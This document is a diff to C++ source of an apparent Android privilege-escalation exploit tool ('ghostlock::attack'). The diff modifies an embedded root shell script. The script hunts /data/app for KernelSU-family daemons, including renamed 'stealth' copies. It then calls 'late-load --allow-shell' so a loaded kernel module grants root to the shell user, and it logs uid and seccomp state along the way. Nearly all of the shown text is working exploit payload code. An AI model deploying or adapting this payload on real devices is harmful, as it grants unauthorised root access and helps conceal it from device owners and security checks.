@@ -239,30 +239,38 @@ namespace ghostlock::attack {
             "HOME_DIR='%s'\n"
             "LOG='%s'\n"
             "SAFE_MODE=%d\n"
-            "KSUD=\"$HOME_DIR/ksud\"\n"
+            "KSUD='%s'\n"
             "echo \"[*] root script start uid=$(id -u) euid=$(id -u)\" >\"$LOG\"\n"
             "chmod 644 \"$LOG\" 2>/dev/null\n"
             "echo \"[*] seccomp=$(grep Seccomp /proc/self/status 2>/dev/null | tr '\\n' ' ')\" >>\"$LOG\"\n"
-            /* XEC: our manager ships the daemon as libxeccli.so under the
-             * com.xecpro.kernel* packages; try it before the upstream names,
-             * and fall back to this fork's xudc daemon paths. */
-            "if [ ! -x \"$KSUD\" ]; then\n"
-            "  KSUD=$(find /data/app -path '*/com.xecpro.kernel*/lib/arm64/libxeccli.so' 2>/dev/null | head -1)\n"
-            "fi\n"
             "if [ ! -x \"$KSUD\" ]; then\n"
             "  KSUD=$(find /data/app -path '*/me.weishu.kernelsu.pr*/lib/arm64/libksud.so' 2>/dev/null | head -1)\n"
+            "fi\n"
+            /* XEC: our manager ships the daemon as libxeccli.so under the
+             * com.xecpro.kernel* packages. Kept ahead of the upstream names so a
+             * device with several KernelSU-family managers picks ours. */
+            "if [ ! -x \"$KSUD\" ]; then\n"
+            "  KSUD=$(find /data/app -path '*/com.xecpro.kernel*/lib/arm64/libxeccli.so' 2>/dev/null | head -1)\n"
             "fi\n"
             "if [ ! -x \"$KSUD\" ]; then\n"
             "  KSUD=$(find /data/app -path '*/me.weishu.kernelsu-*/lib/arm64/libksud.so' 2>/dev/null | head -1)\n"
             "fi\n"
             "if [ ! -x \"$KSUD\" ]; then\n"
+            "  KSUD=$(find /data/app -path '*/com.sukisu.ultra*/lib/arm64/libksud.so' 2>/dev/null | head -1)\n"
+            "fi\n"
+            "if [ ! -x \"$KSUD\" ]; then\n"
             "  KSUD=$(find /data/app -path '*/com.resukisu.resukisu*/lib/arm64/libksud.so' 2>/dev/null | head -1)\n"
+            "fi\n"
+            "if [ ! -x \"$KSUD\" ]; then\n"
+            "  KSUD=$(find /data/app -path '*/org.bakasu.bakasu-*/lib/arm64/libksud.so' 2>/dev/null | head -1)\n"
             "fi\n"
             "if [ ! -x \"$KSUD\" ]; then\n"
             "  KSUD=$(find /data/app -path '*/com.kowx712.supermanager*/lib/arm64/libksud.so' 2>/dev/null | head -1)\n"
             "fi\n"
             "if [ -z \"$KSUD\" ]; then KSUD=/data/local/tmp/ksud; fi\n"
             "if [ ! -x \"$KSUD\" ]; then KSUD=/data/adb/ksu/bin/ksud; fi\n"
+            /* XEC: this fork renames the ksud daemon to `xudc` and also exposes it
+             * at /data/adb/xudc (stealth renames). Upstream never looks there. */
             "if [ ! -x \"$KSUD\" ]; then KSUD=/data/adb/ksu/bin/xudc; fi\n"
             "if [ ! -x \"$KSUD\" ]; then KSUD=/data/adb/xudc; fi\n"
             "echo \"[*] ksud=$KSUD\" >>\"$LOG\"\n"
@@ -396,7 +404,13 @@ namespace ghostlock::attack {
             "  fi\n"
             "  echo \"[*] late-load kmi=$KMI\" >>\"$LOG\"\n"
             "  chmod 755 \"$KSUD\" 2>/dev/null\n"
-            "  \"$KSUD\" late-load --kmi \"$KMI\" --allow-shell >>\"$LOG\" 2>&1\n"
+            /* XEC: upstream dropped --allow-shell (its ksud no longer takes it),
+             * but this fork's `xudc late-load` still needs allow_shell=1 so the
+             * freshly loaded module grants the shell UID — without it the whole
+             * late-load route ends in「no root」. Ask for it first, fall back to
+             * the upstream invocation when the daemon in use rejects the flag. */
+            "  \"$KSUD\" late-load --kmi \"$KMI\" --allow-shell >>\"$LOG\" 2>&1 || \\\n"
+            "    \"$KSUD\" late-load --kmi \"$KMI\" >>\"$LOG\" 2>&1\n"
             "  echo \"[*] late-load exit=$?\" >>\"$LOG\"\n"
             "fi\n"
             "echo \"[*] temp su uid=$(id -u); watching kernelsu.ko\" >>\"$LOG\"\n"
@@ -420,6 +434,7 @@ namespace ghostlock::attack {
             (config::runtime_config_snapshot().home_dir.c_str()),
             (config::runtime_config_snapshot().ksu_log_path.c_str()),
             session::g_exploit_session.profile.safe_mode() ? 1 : 0,
+            (config::runtime_config_snapshot().ksud_path.c_str()),
             (config::runtime_config_snapshot().debug_dir.c_str()));
         if (n < 0 || n >= static_cast<int32_t>(script.size())) {
             pr_warning("root script too long\n");
